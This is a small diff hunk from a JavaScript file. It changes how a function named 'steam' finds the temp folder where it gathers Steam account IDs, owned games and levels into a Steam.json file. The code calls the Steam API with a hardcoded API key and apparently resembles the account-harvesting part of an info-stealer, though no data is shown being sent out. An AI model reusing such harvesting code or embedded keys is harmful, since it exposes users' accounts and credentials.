@@ -62,7 +62,7 @@ const steam = async () => {
       const { response: games } = (await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`)).data;
       const { response: level } = (await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`)).data;
 
-      const accountsFile = JSON.parse(fs.readFileSync(join(tempFolder, 'Steam.json'), 'utf8'));
+      const accountsFile = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Steam.json'), 'utf8'));
       accountsFile.push({
         accountId: account, accountInfo, games, level
       });
